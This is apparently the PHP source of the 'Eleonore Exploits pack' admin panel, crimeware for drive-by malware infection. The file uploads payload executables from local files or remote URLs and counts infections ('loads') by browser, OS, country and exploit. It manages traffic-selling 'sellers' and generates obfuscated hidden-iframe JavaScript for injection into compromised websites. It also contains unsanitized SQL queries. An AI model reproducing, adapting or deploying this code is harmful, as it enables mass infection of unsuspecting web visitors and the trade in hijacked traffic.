<?php



error_reporting(0);
session_start ();
include'config.php';

$name_buy = "...";
$el_vers = "1.4.4mod";
if (isset ($_SESSION["logged"])) 
{ 
$auth_check="ok";
include ("geoip.php"); 
}
else {
	if (@$_POST["login"] == $admin and @$_POST["passwd"] == $pwd) { $_SESSION["logged"] = true; Header ("Location: ?"); exit; }
}
if (isset($_GET['logout'])) {
	session_destroy ();
	Header ("Location: ?");
	exit;
}


if ($auth_check=="ok")
{



mysql_connect($db_host, $db_user, $db_pass);
mysql_select_db($db_name);

if(isset($_GET['sellers2'])) 
{

	if(isset($_GET['del'])) 
	{
	$sql= "DELETE FROM `seller` WHERE `link`='".$_GET['del']."'";
    $r = mysql_query($sql);
	$sql= "DELETE FROM `statistic` WHERE seller ='".$_GET['del']."' ";
    $r = mysql_query($sql);
	$err = "2";
	}
	if(isset($_GET['clrs'])) 
	{
	$sql= "DELETE FROM `statistic` WHERE seller ='".$_GET['clrs']."' ";
    $r = mysql_query($sql);
	$err = "1";
	}
Header ("Location: ?sellers=1&err=$err");
die;
}

		$sql = "select count(*) as total_traff from statistic";
		$r = mysql_query($sql);
		$fst_traff = mysql_fetch_array($r);
		$sql = "select count(*) as total_loads from statistic where good=1";
		$r = mysql_query($sql);
		$fst_loads = mysql_fetch_array($r);
		$fst_percent = sprintf("%3.2f", ($fst_loads[0]/($fst_traff[0]/100)));
function detect_country_name($country_code) {
        $gi = geoip_open ("GeoIP.dat", "");
        $country_name = geoip_country_name_by_code($gi, strtoupper($country_code));
        if(empty($country_name)) $country_name = "Unknown";
        return $country_name;
}
  	
$country_name = detect_country_name($country_code);

$main_echo = "
Eleonore exploits pack version $el_vers for ".$name_buy.".<br><strong>Fast statistic :</strong><br>Traffic: ".$fst_traff[0]." / Loads: ".$fst_loads[0]." / Percent: ".$fst_percent."%
";

}
else{
$login_echo = "
<br>
A u t h o r i z a t i o n :
<br>
          <form id='contactform' method='post'>
            <table border='0' cellspacing='3' cellpadding='0'>
              <tbody>
                <tr>
                  <td><label for='contactform-name'>&nbsp;Login:</label>
                    &nbsp;<input type='text' name='login' id='contactform-name' />
                  </td>

                <tr>
                  <td><label for='contactform-subject'>&nbsp;Password: </label>
                     &nbsp;<input type='password' name='passwd' id='contactform-name' />
                  </td>
                </tr>
                <tr>
                 <td>
                    <center><input type='image' alt='send message' class='imagesubmit' src='i/submit.jpg' /></center>
                  </td>
                </tr>
              </tbody>
            </table>
          </form>
		  		  </td></tr></table> </center></div><br><br><br><br><br><br>
	   </div>
     </div>	  
     <br><br><center>All rights reserved by <i>ExManoize</i>.<br><br></center>
  </div>
</div>
</body>
</html>
";
$main_echo = "
Eleonore Exploits pack version $el_vers<br>
Please enter your login and password.

";
}

?>
<head>
<title>.:: Eleonore Exp ::.</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
<!--
@import url("i/index.css");
-->
</style>
<!--[if IE]>
<style type="text/css">
p.note-general, p.note-warning { color: #666666; }
</style>
<![endif]-->
<!--[if IE 6]>
<style type="text/css">
#footer { height: 1em; }
</style>
<![endif]-->
<!--[if IE 5.5]>
<style type="text/css">
pre { width: 453px; }
</style>
<![endif]-->
</head>
<body id="gordonmac-com" class="homepage">
<div id="wrapper-a">
  <div id="wrapper-b">
    <div id="heading">
      <h1><a href="#">Exploit PAck</a></h1>
      <h2>Exploit pack</h2>

      <p id="heading-intro"><?php echo $main_echo;?></p>
      
      <ul id="nav-a">
<?php
if ($auth_check=="ok")
{
?>
<li id="nav-a-sell"><a href="stat.php?sellers=1">Sellers</a></li>
		<li id="nav-a-file"><a href="stat.php?exefile=1">File</a></li>
        <li id="nav-a-main"><a href="stat.php">Home</a></li>
        <li id="nav-a-referer"><a href="stat.php?refer=1">Referer</a></li>
        <li id="nav-a-country"><a href="stat.php?country=1">Country</a></li>
        <li id="nav-a-clear"><a href="stat.php?clear=1">Clear</a></li>
		<li id="nav-a-logout"><a href="stat.php?logout=1">Logout</a></li>
<?php
}
?>	
		
			
      </ul>
    </div>
    <div id="content">
      <div id="content-a">
        <div id="content-a-inner">
          <center>
		  <br>	  
		  




 
		  
<?php

if ($auth_check!=="ok")
{
echo $login_echo;
die;
exit;
}
function osl($a)
{
$a = strip_tags($a);
$a = htmlspecialchars($a);
$a = mysql_escape_string($a);
return $a;
}
if(isset($_GET['clear']))
{
	$sql = 'TRUNCATE `statistic`';
	mysql_query($sql);

	echo "<center><strong>Eleonore Exp PACK statistic clear successfully!</strong></center>";
	echo "</body></html>";
}

// =================================================== EXE FILE UPLOAD =============================================//
if(isset($_GET['exefile'])) 
{

function _loaddat($url)
{
$filelog = fopen ("load/load.dat", 'w');
$date = date("d.m.Y");
$time = date("H:i:s");
$log = $date."|".$time."|".$url;
fwrite($filelog, $log);
fclose($filelog);
}



if (isset($_POST['local']))
{
	if (is_uploaded_file($_FILES['userfile']['tmp_name']))
	{
		move_uploaded_file($_FILES['userfile']['tmp_name'], "load/".$file_load);
		_loaddat("local upload");
		echo "File upload is succesful.";
		
	}
	else {
		echo "Possible file upload attack. Filename: " . $_FILES['userfile']['name'];
	}
}
if(isset($_POST['urlfile']))
{
if (!eregi("http://",$_POST['urlfile']))
	$_POST['urlfile'] = "http://".$_POST['urlfile'];
$fn = $_POST['urlfile'];
$handle = fopen ($fn, 'rb');
$contents = "";
if(!$handle)
	echo 'Error open source file';
else
{
	while(!feof($handle))
	{
		$data = fread($handle, 8192);
		$contents .= $data;
	}
fclose ($handle);
$handle = fopen ("load/".$file_load, 'wb');
if(!$handle)
	echo 'Error create local file';
else
{	fwrite($handle, $contents);
	fclose($handle);
	echo 'File upload is succesful.';
	_loaddat($_POST['urlfile']);	
}
}
}



$filesize = filesize("load/".$file_load);
$fdat = fopen ("load/load.dat", 'r');
$fdat = fread($fdat,filesize("load/load.dat"));
$fdat = explode("|",$fdat);




?>


 <table border='0' cellspacing='0' cellpadding='0'>
              <tbody>
                <tr>
                  <td><label for='contactform-name'><b>Local file upload:</b></label>

<form enctype="multipart/form-data" action="" method="post">
<input SIZE=60 type="file" name="userfile"><br>
<input type="hidden" name="local" value="yes">
<center><input type='image' alt='send message' class='imagesubmit' src='i/submit.jpg' /><center>
</form>
				  				  
                  </td>
				  </tr></tbody></table>
				  <br>
 <table border='0' cellspacing='0' cellpadding='0'>
              <tbody>
                <tr>
                  <td><label for='contactform-name'><b>Remote file upload from url:</b></label>


<form action="" method="post">
<input SIZE=60 type="text" name="urlfile" value="http://"><br>
<center><input type='image' alt='send message' class='imagesubmit' src='i/submit.jpg' /></center>
</form>
  </td>
				  </tr></tbody></table>
				  
<br><br>
				  


				  
<table  border=0 align='center'>
<tr><td> <i>upload file iformation</i> </td> </tr>
	<tr  >
	<td  align='center'><b>Date:</b></td>
	<td  align='center'><b>Time:</b></td>
	<td  align='center'><b>URL from upload:</b></td>
	<td  align='center'><b>File size:</b></td>
	</tr>
	<tr  >
	<td  align='center'><?php echo $fdat[0];?></td>
	<td  align='center'><?php echo $fdat[1];?></td>
	<td  align='center'><?php echo $fdat[2];?></td>
	<td  align='center'><?php echo round(($filesize / 1024), 2);?>KB <small>(<?php echo $filesize;?> bytes)</small></td>
	</tr>
	</table>


<?php
}


// =================================================== SELLERS  =============================================//
elseif(isset($_GET['sellers'])) 
{

if ($_GET['err']=="1") $err = "Seller stat is cleared.";
if ($_GET['err']=="2") $err = "Seller deleted.";
	$sql = 'SELECT name,link FROM `seller` ORDER BY `name` ASC';
    $r = mysql_query($sql);
	
	
	
	echo "
<a href=?cr_sell=1>Create new seller</a>
<br>
$err
<br>
<table  border=0 align='center'>
	<tr  >
	<td  width='50' align='center'><b>Seller:</b></td>
	<td width='150' align='center'><b>Stats:</b></td> 
	<td width='20' align='center'><b>Delete:</b></td>
	<td width='20' align='center'><b>Clear:</b></td>
	<td width='20' align='center'><b>Links:</b></td>
	</tr>";

	
	
	
	while ($row = mysql_fetch_array($r)) {
	$sql = "SELECT  sum(good) AS good, count( * ) AS total FROM statistic WHERE seller='".$row['link']."'";
    $r2 = mysql_query($sql);
	$x=mysql_fetch_array($r2);
	if ($x['good']==""){$x['good']="0";}
	if ($x['total']==""){$x['total']="0";}
		echo "<tr ><td nowrap='nowrap' ' width='95' align='center'><a target=_blank href=".$url."/sellrs.php?s=".$row['link']." >".$row['name']."</a></td>";
		echo "<td nowrap='nowrap'  align='center' width='50'>".$x['total']." / ".$x['good']." / ".round($x['good']/$x['total']*100, 2)." %</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'> <a href=?sellers2=1&del=".$row['link']." >Delete seller</a> </td>";
		echo "<td nowrap='nowrap'  align='center' width='50'> <a href=?sellers2=1&clrs=".$row['link']." >Clear stats </a></td>";
		echo "<td nowrap='nowrap'  align='center' width='55'> <a href=?info_sell=".$row['link']." > Links info </a> </td></tr>";
	}
	echo "</table><br>";

}
elseif(isset($_GET['info_sell'])) 
{

	$sql = "SELECT `name`, `link`,`desc` FROM seller WHERE link ='".$_GET['info_sell']."'";
    $r = mysql_query($sql);
	echo "<a href=?sellers=1>Back to all sellers </a><br><table  border=0 align='center'>
	<tr  >
	<td  width='50' align='center'><b>Seller:</b></td>
	<td width='500' align='center'><b>Link:</b></td> 
	<td width='50' align='center'><b>Comments:</b></td>
	</tr>";
	
	while ($row = mysql_fetch_array($r)) {
		echo "<tr ><td nowrap='nowrap' ' width='50' align='center'>".$row['name']."</td>";
		echo "<td nowrap='nowrap'  align='link' width='500'>Link for traffs:<br><b> ".$url."/index.php?s=".$row['link']."</b>
		<br>Link for stat:<br> <b>".$url."/sellrs.php?s=".$row['link']."</b>
		</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'> ".$row['desc']." </td></tr>";
	}
	
	echo "</table><br>";	

}
elseif(isset($_GET['cr_sell'])) 
{
	if(isset($_POST['snick'])) 
	{
	$snick = osl($_POST['snick']);

	mysql_connect($db_host, $db_user, $db_pass);
	mysql_select_db($db_name);
	$q = mysql_query("select * from seller WHERE name='".$snick."'");
	$n = mysql_num_rows($q);
	@mysql_free_result($q);
	if ($n != 0)  {$err="ERROR! Seller is available<br>";} 
	else
	{
	$link = md5($_POST['snick'].date("Y-m-d H:i:s", time()));
	$q = mysql_query("insert into `seller` (`name`, `link`, `desc`) values ('".$snick."', '".$link."', '".$_POST['desc']."')");
	
	@mysql_free_result($q);
	echo "<b>Ok. Seller create is successful.</b><br>";
	
	$sql = "SELECT `name`, `link`,`desc` FROM seller WHERE name ='".$snick."'";
    $r = mysql_query($sql);
	echo "<a href=?sellers=1>Back to all sellers </a><br><table  border=0 align='center'>
	<tr  >
	<td  width='50' align='center'><b>Seller:</b></td>
	<td width='500' align='center'><b>Link:</b></td> 
	<td width='50' align='center'><b>Comments:</b></td>
	</tr>";
	
	while ($row = mysql_fetch_array($r)) {
		echo "<tr ><td nowrap='nowrap' ' width='50' align='center'>".$row['name']."</td>";
		echo "<td nowrap='nowrap'  align='link' width='500'>Link for traffs:<br><b> ".$url."/index.php?s=".$row['link']."</b>
		<br>Link for stat:<br> <b>".$url."/sellrs.php?s=".$row['link']."</b>
		</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'> ".$row['desc']." </td></tr>";
	}
	
	echo "</table><br>";	
	}

		
	
	}
	
	

	
	

echo "<B>".$err."</b>";
?>	
Create seller:
<br>

          <form id='contactform' method='post'>
            <table border='0' cellspacing='3' cellpadding='0'>
              <tbody>
                <tr>
                  <td colspan="0" style="text-align: center;"><label for='contactform-subject'>&nbsp;Seller nick:</label>
                    &nbsp;<input type='text' name='snick' id='contactform-name' />
                  </td>

                <tr>
                  <td colspan="0" style="text-align: center;"><label for='contactform-subject'>&nbsp;Comments: </label>
                     &nbsp; <textarea rows="4" name='desc' style="width:95%;"> </textarea>
                  </td>
                </tr>
                <tr>
                 <td>
                    <center><input type='image' alt='send message' class='imagesubmit' src='i/submit.jpg' /></center>
                  </td>
                </tr>
              </tbody>
            </table>
          </form>

<?php
}














// =================================================== IFRAME obfuscation  =============================================//

elseif(isset($_GET['iframe']))  
{
function get_random_string_array($len, $c)
{
	$srt_array=array();
	for($a=0; $a <= $c; $a++){
		$result="";
		$nums="1234567890";
		$syms="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		$sux=$nums.$syms;
		for($i=0; $i < $len; $i++)
	   {
	    	$num=rand(0, strlen($sux)-1);
	     	$result .= $sux[ $num ];
	   }
	    $srt_array[]=$syms[rand(0,strlen($syms)-1)].$result;
	}
	 return $srt_array;
}
function escape($str){
$encode_str='';
for ($i=0;$i<strlen($str);$i++){
$encode_str.='%'.dechex(ord($str[$i]));
}

return $encode_str;
}


$path_parts = pathinfo("http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
$donefolder = $path_parts['dirname'];
$coding = '';
$frame = '<iframe src="' . $donefolder . '/index.php" width="0" height="0" frameborder="0"></iframe>';


function escapeX($str){
$encode_str='';
for ($i=0;$i<strlen($str);$i++){
$encode_str.='0 0'.dechex(ord($str[$i]));
}

return $encode_str;
}




$a = " <script> var Z = '".escapeX($frame)."'; XX = Z.replace(/0 0/g,'%'); document.write(unescape(XX)); </script> ";

$donefolder1 = escape($donefolder);
$a2 = '<script> var x = unescape("' . $donefolder1 . '");document.write("<i"+"fr"+"am"+"e s"+"r"+"c=\""+x+"/ind"+"e"+"x.p"+"hp\" w"+"id"+"th=\"0\" he"+"i"+"ght=\"0\" fr"+"a"+"m"+"ebor"+"de"+"r=\"0\"><"+"/ifra"+"m"+"e>");  </script>';

$donefolder = $donefolder."/index.php";


?>
<table border="0" cellspacing="0" cellpadding="0" style="width:99%">
<tr>
<td colspan="0" style="text-align: center;"><font size="-1">URL for traffic:</font></td>
</tr>
<tr>
<td colspan="0" style="width:50%; text-align: center;">
<textarea rows="1" style="width:70%;"><?php echo  $donefolder ; ?></textarea>
</td>
</tr>
<tr>
<td colspan="0" style="text-align: center;"><font size="-1">Iframe code:</font></td>
</tr>
<tr>
<td colspan="0" style="width:50%; text-align: center;">
<textarea rows="1" style="width:70%;"><?php echo  $frame; ?></textarea>
</td>
</tr>
<tr>
<td colspan="0" style="text-align: center;"><font  size="-1">encode iframe:</font></td>
</tr>
<tr>
<td colspan="0" style="width:50%; text-align: center;">
<textarea rows="4" style="width:70%;"><?php echo $a; ?></textarea>
</td>
</tr>
<tr>
<td colspan="0" style="text-align: center;"><font size="-1">encode iframe meth2:</font></td>
</tr>
<tr>
<td colspan="0" style="width:50%; text-align: center;">
<textarea rows="7" style="width:70%;"><?php echo $a2; ?></textarea>
</td>
</tr>
</table>


<?php

}

// =================================================== stat of country =============================================//

elseif (isset($_GET['country'])) {
	$sql = 'SELECT country, sum(good) AS good, count( * ) AS total FROM statistic GROUP BY country ORDER BY `total` DESC';
    $r = mysql_query($sql);

	echo "<table border=0 align='center' >";
	echo "
	<tr  >
	<td   width='5' align='center'><b>Country:</b></td>
	<td  width='55' align='center'><b>Traffic:</b></td>
	<td  width='55' align='center'><b>Loads:</b></td>
	<td  width='50' align='center'><b>Percent:</b></td>
	</tr>";
	while ($row = mysql_fetch_array($r)) {

		echo "<tr ><td nowrap='nowrap' ' width='95' align='center'>".$row['country']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'>".$row['total']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'>".$row['good']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='55'>".round($row['good']/$row['total']*100, 2)." %</td></tr>";
	}
	echo "</table><br>";
}
// =================================================== stat of referer =============================================// 
elseif (isset($_GET['refer'])){
	

    $sql = 'SELECT refer, sum(good) AS good, count( * ) AS total FROM statistic GROUP BY refer ORDER BY `total` DESC';
    $r = mysql_query($sql);
    echo "<table border=0  align='center'>
	<tr >
	<td nowrap='nowrap'  width='300'><b>HTTP Referer:</b></td>
	<td nowrap='nowrap'  align='center' width='87'><b>Trafic:</b></td>
	<td nowrap='nowrap'  align='center' width='87'><b>Loads:</b></td>
	<td nowrap='nowrap'  align='center' width='87'><b>Percent:</b></td>
	</tr>";
		
	while ($row = mysql_fetch_array($r)) {

	    if ($row['refer']=="") {
			$row['refer']=" -- ";
		}
		echo "<tr >";
		echo "<td nowrap='nowrap'  width='255'>".$row['refer']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='55'>".$row['total']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'>".$row['good']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='55'>".round($row['good']/$row['total']*100, 2)." %</td></tr>";
	}
	echo "</table>";
}
else{
// =================================================== MAIN STAT  =============================================//


	$sql = 'select os, count(*) as total from statistic group by os ORDER BY `total` DESC';
	$r = mysql_query($sql);
	$row = mysql_fetch_array($r);
	if($row==0)
		{
			echo "<center><strong>No traffics!</strong></center>
					</div>
	   </div>
     </div>	  
     <br><br><center>All rights reserved by <i>ExManoize</i>.<br><br></center>
  </div>
</div>
</body>
</html>";
			die;
			exit;
		}
	
	
	$r = mysql_query($sql);
	echo "
	<table border=0  align='center'>
	<tr>
    <td align='left' width='390'><b>Operation Systems:</b></td>
	<td  width='87' align='center'><b>Totals:</b></td> 
	</tr>
	";
	while ($row = mysql_fetch_array($r)) {
		echo "
		<tr >
		<td nowrap='nowrap' width='390'>&nbsp;".$row['os']."</td>
		<td nowrap='nowrap'  align='center' width='87'>".$row['total']."</td>
		</tr>";
}



	echo "</table>";
	
//=========== main // sploits  ===========//
	
	$sql = 'SELECT spl, sum(good) AS spgood FROM statistic where good=1 GROUP BY spl ORDER BY `spgood`';
    $r = mysql_query($sql);
	echo "<br><table  border=0 align='center'>
	<tr  >
	<td  width='315' align='left'><b>Sploit:</b></td>
	<td width='20' align='center'><b>Loads:</b></td>
	</tr>";
	
	while ($row = mysql_fetch_array($r)) {
        echo "
		<tr >
		<td > &nbsp;".$row['spl']."</div></td>
		<td align='center'>".$row['spgood']."</td>
		</tr>";
	  

	}
	echo "</table><br>";
	
	
	
	
//=========== main // browsers  ===========//
	
	$sql = 'SELECT br, sum(good) AS good, count( * ) AS total FROM statistic GROUP BY br ORDER BY `br`';
    $r = mysql_query($sql);
	echo "<br><table  border=0 align='center'>
	<tr  >
	<td  width='315' align='left'><b>Browsers:</b></td>
	<td width='20' align='center'><b>Traffic:</b></td>
	<td width='20' align='center'><b>Loads:</b></td>
	<td width='20' align='center'><b>Percent:</b></td>
	</tr>";
	
	while ($row = mysql_fetch_array($r)) {
        echo "
		<tr >
		<td > &nbsp;".$row['br']."</div></td>
		<td  align='center' width='55'>".$row['total']."</td>
		<td align='center'>".$row['good']."</td>
		<td align='center'>".round($row['good']/$row['total']*100, 2)."</td>
		</tr>";
	  

	}
        echo "<tr></tr><tr></tr><tr></tr>
		<tr >
		<td ><b>Total stats:</b></div></td>
		<td  align='center' width='55'>".$fst_traff[0]."</td>
		<td align='center'>".$fst_loads[0]."</td>
		<td align='center'>".$fst_percent." %</td>
		</tr>";
	echo "</table><br>";
	
	
	
//=========== main // 10 top country  ===========//

	$sql = 'SELECT country, count(*) as total FROM statistic group by country ORDER BY `total` DESC LIMIT 10';
	$r = mysql_query($sql);
	echo "
	<table border=0  align='center'>
	<tr>
    <td align='left' width='390'><b>Top 10 countries:</b></td>
	<td  width='87' align='center'><b>Totals:</b></td> 
	</tr>
	";
	while ($row = mysql_fetch_array($r) and $ii<=10) {
		echo "
		<tr >
		<td nowrap='nowrap' width='390'>&nbsp;".$country_name = detect_country_name($row['country'])."</td>
		<td nowrap='nowrap'  align='center' width='87'>".$row['total']."</td>
		</tr>";
		$ii++;
}
	echo "</table><br>";	
}
?>

		  </td></tr></table> </center></div>
	   </div>
     </div>	  
     <br><br><center>All rights reserved by <i>ExManoize</i>.<br><br></center>
  </div>
</div>
</body>
</html>